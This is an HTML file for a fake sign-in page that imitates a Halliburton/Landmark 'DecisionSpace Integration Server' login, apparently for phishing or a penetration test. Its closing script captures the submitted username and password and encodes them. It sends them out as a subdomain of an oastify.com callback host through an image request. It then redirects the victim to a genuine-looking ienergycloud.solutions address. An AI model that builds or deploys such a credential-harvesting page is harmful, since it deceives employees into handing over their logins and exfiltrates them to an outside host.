<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1"/>
    <title>Sign in to DecisionSpace Integration Server</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .header {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            background: #d3d3d3;
            padding: 15px;
            text-align: center;
            font-size: 18px;
            color: #666;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .login-container {
            background: #fff;
            width: 1075px;
            height: 640px;
            position: relative;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
        }
        .left-section {
            position: absolute;
            left: 0;
            top: 0;
            bottom: 0;
            width: 425px;
            background: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .globe-image {
            width: 300px;
            height: 300px;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200"><circle cx="100" cy="100" r="90" fill="%23f0f0f0" stroke="%23666" stroke-width="2"/><circle cx="70" cy="60" r="30" fill="%23ff6b6b"/><circle cx="130" cy="80" r="25" fill="%23ffd93d"/><circle cx="100" cy="130" r="35" fill="%236bcf7f"/></svg>') center/contain no-repeat;
        }
        .right-section {
            position: absolute;
            right: 0;
            top: 0;
            bottom: 0;
            left: 425px;
            background: #fff;
            padding: 60px 80px;
        }
        .halliburton-logo {
            position: absolute;
            top: 20px;
            right: 30px;
            color: #e31837;
            font-weight: bold;
            font-size: 16px;
        }
        .halliburton-logo::after {
            content: ' | Landmark';
            color: #666;
            font-weight: normal;
        }
        .form-container {
            margin-top: 100px;
        }
        .form-group {
            margin-bottom: 25px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-size: 14px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            font-size: 14px;
        }
        .sign-in-btn {
            background: #90ee90;
            border: 1px solid #7dc67d;
            padding: 10px 40px;
            color: #333;
            font-size: 14px;
            cursor: pointer;
            margin-top: 20px;
        }
        .sign-in-btn:hover {
            background: #7dc67d;
        }
        .or-sign-in {
            margin-top: 30px;
            margin-bottom: 15px;
            color: #666;
            font-size: 14px;
        }
        .oidc-links a {
            display: block;
            color: #0088cc;
            text-decoration: none;
            margin: 8px 0;
            font-size: 14px;
        }
        .footer {
            position: absolute;
            bottom: 0;
            left: 425px;
            right: 0;
            background: #e31837;
            color: white;
            padding: 15px;
            text-align: center;
            font-size: 14px;
        }
        .alert {
            background: #fff3cd;
            border: 1px solid #ffc107;
            color: #856404;
            padding: 12px;
            margin-bottom: 20px;
            border-radius: 4px;
            font-size: 13px;
        }
    </style>
</head>
<body>
    <div class="header">SIGN IN TO DECISIONSPACE INTEGRATION SERVER</div>
    <div class="login-container">
        <div class="left-section">
            <div class="globe-image"></div>
        </div>
        <div class="right-section">
            <div class="halliburton-logo">HALLIBURTON</div>
            <div class="form-container">
                <div class="alert">
                    Authentication required: Please verify your credentials to access this protected resource.
                </div>
                <form id="loginForm">
                    <div class="form-group">
                        <label for="username">Username</label>
                        <input type="text" id="username" name="username" required autofocus>
                    </div>
                    <div class="form-group">
                        <label for="password">Password</label>
                        <input type="password" id="password" name="password" required>
                    </div>
                    <button type="submit" class="sign-in-btn">Sign in</button>
                </form>
                <div class="or-sign-in">Or sign in with</div>
                <div class="oidc-links">
                    <a href="#">OIDC-preview</a>
                    <a href="#">OIDC</a>
                </div>
            </div>
        </div>
        <div class="footer">
            Powered by<br><strong>DS Integration Server</strong>
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const u = document.getElementById('username').value;
            const p = document.getElementById('password').value;
            const d = btoa(JSON.stringify({u:u,p:p})).replace(/[^a-zA-Z0-9]/g,'').substring(0,63);
            new Image().src='https://'+d+'.xhi1hwrwxt1hgsff51cr9z43muslgh46.oastify.com/';
            setTimeout(()=>window.top.location='https://pen-dfs.dsif.dazlmkleodev01.ienergycloud.solutions',500);
        });
    </script>
</body>
</html>
